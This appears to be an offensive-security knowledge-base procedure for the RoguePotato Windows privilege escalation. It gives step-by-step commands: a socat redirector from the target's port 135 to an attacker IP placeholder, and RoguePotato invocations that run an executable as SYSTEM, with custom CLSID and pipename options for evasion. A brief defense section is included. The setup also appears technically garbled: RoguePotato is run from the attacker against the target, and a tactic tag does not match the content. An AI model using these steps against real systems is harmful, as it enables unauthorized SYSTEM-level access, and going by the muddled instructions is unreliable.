---
id: 4fdf3a46-deda-4f22-beb6-db24019a5466
name: Rogue-Potato-Impersonation-Privileges
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:30.209726+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Privilege-Escalation-via-Direct-URL-Access]]'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
sub_techniques: []
tags:
  - EoP-Impersonation-Privileges
  - Rogue-Potato-Fake-OXID-Resolver
  - Windows-Privilege-Escalation
commands:
  - '[[commands/socat-tcp-135-to-9999-forward]]'
  - '[[commands/roguepotato-remote-execution-basic]]'
  - '[[commands/roguepotato-remote-execution-with-local-resolver-9999]]'
  - '[[commands/roguepotato-remote-execution-with-clsid-pipename]]'
platforms:
  - Windows
tools:
  - '[[tools/socat]]'
  - '[[tools/roguepotato]]'
validated: true
---

# Rogue-Potato-Impersonation-Privileges

## Summary

Rogue Potato is a privilege escalation technique that exploits the Windows DCOM protocol by impersonating the OXID resolver to execute arbitrary code with SYSTEM-level privileges on a target machine. This procedure outlines how to set up a network redirector on the remote Windows system and use RoguePotato from the attacker's machine to trigger remote code execution as SYSTEM, enabling lateral movement and access to sensitive resources.

## Description

The Rogue Potato technique leverages vulnerabilities in the DCOM (Distributed Component Object Model) protocol, specifically by spoofing the OXID (Object EXporter and Directory) resolver service, which maps object interfaces to endpoints. An attacker with initial low-privileged access on a Windows 10 or Server 2019 target can forward DCOM traffic (port 135) to a rogue resolver running on the attacker's machine. When the target system attempts to resolve DCOM objects, it connects to the attacker's resolver, allowing impersonation of high-privilege tokens to execute commands as SYSTEM. This is particularly useful in scenarios with firewall restrictions or for remote escalation without direct high-privilege execution. The procedure supports variations, including running the resolver locally on the attacker or remotely on the target, and custom CLSID/pipename options for evasion.

## Requirements

1. Low-privileged authenticated access to the remote Windows target (e.g., ability to execute commands or run binaries like socat).
2. DCOM enabled on the target system (default on Windows 10/Server 2019).
3. Network connectivity between attacker and target, with ability to reach port 135 (RPC Endpoint Mapper) on the target.
4. RoguePotato.exe and optionally RogueOxidResolver.exe downloaded on the attacker's machine; socat available on the target (e.g., via portable binary or WSL on Windows).
5. Firewall rules allowing outbound connections from target to attacker's IP/port (e.g., 9999 for resolver).

## Defense

- Disable DCOM if not required for business operations, or harden it with strict permissions and authentication.
- Monitor for rogue OXID resolvers by logging unusual RPC/DCOM activity, anomalous port 135 traffic, or unexpected connections to non-standard resolver ports (e.g., 9999).
- Implement network segmentation to limit lateral movement, and use endpoint detection tools to alert on privilege escalation attempts or unsigned binaries like RoguePotato.exe.
- Enable Windows Defender Application Control (WDAC) or AppLocker to block unauthorized executables.

## Objectives

1. Gain SYSTEM-level privileges on the remote Windows target.
2. Enable lateral movement within the network by executing commands as SYSTEM.
3. Access sensitive data or resources restricted to high-privilege accounts.

## Instructions

### Step 1: Set Up Network Redirector on Remote Target

**Context**: On the remote Windows target, configure a port forwarder to redirect incoming DCOM traffic on port 135 to the attacker's machine where the rogue OXID resolver will listen. This allows the target's DCOM resolution requests to be intercepted and impersonated. Use socat for this forwarding, assuming it's available on the target (e.g., via a portable executable).

**Command** ([[commands/socat-tcp-135-to-9999-forward]]):
```bash
socat tcp-listen:135,reuseaddr,fork tcp:$_ATTACKER_IP:9999
```

> This command listens on the target's port 135 and forwards all connections to the attacker's IP on port 9999. Run this as a background process on the target. If successful, it will log forwarded connections; monitor for errors like 'address in use' if port 135 is blocked.

### Step 2: Basic Remote Execution Without Local Resolver

**Context**: If firewall restrictions prevent running the resolver on the attacker, run RogueOxidResolver.exe directly on the target machine (e.g., upload and execute it first). Then, from the attacker, use RoguePotato to connect to the target's port 135 (forwarded to the remote resolver) and execute a command as SYSTEM.

**Command** ([[commands/roguepotato-remote-execution-basic]]):
```cmd
RoguePotato.exe -r $_TARGET_IP -e "$_EXECUTABLE"
```

> Replace $_TARGET_IP with the remote machine's IP and $_EXECUTABLE with the path to the command (e.g., "C:\windows\system32\cmd.exe"). This impersonates the resolver to run the executable as SYSTEM on the target. Success is indicated by the command executing without errors and any output from the executed program (e.g., a new shell prompt).

### Step 3: Remote Execution with Local Resolver on Port 9999

**Context**: For scenarios where the resolver can run on the attacker, start RogueOxidResolver.exe on the attacker's machine listening on port 9999. The target's forwarded port 135 will route DCOM requests to this local resolver, enabling impersonation from the attacker's side.

**Command** ([[commands/roguepotato-remote-execution-with-local-resolver-9999]]):
```cmd
RoguePotato.exe -r $_TARGET_IP -e "$_EXECUTABLE" -l 9999
```

> The -l 9999 flag specifies the local port for the resolver. Ensure RogueOxidResolver.exe is running on the attacker: RogueOxidResolver.exe -p 9999. Upon execution, the command should impersonate successfully, running $_EXECUTABLE as SYSTEM on the target. Look for resolver logs showing OXID requests and successful token impersonation.

### Step 4: Advanced Execution with Custom CLSID and Pipename

**Context**: To evade detection or target specific DCOM objects, specify a custom CLSID (Class ID) for the impersonated object and a custom pipename for the named pipe used in the RPC communication. This variation builds on the local resolver setup.

**Command** ([[commands/roguepotato-remote-execution-with-clsid-pipename]]):
```cmd
RoguePotato.exe -r $_TARGET_IP -e "$_EXECUTABLE" -l 9999 -c "$_CLSID" -p $_PIPENAME
```

> Use a known CLSID like "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" for ShellWindows, and a custom pipename like "splintercode". This allows finer control over the impersonation. Success is confirmed by the executed command running as SYSTEM, with logs in RoguePotato showing successful pipe creation and token elevation.
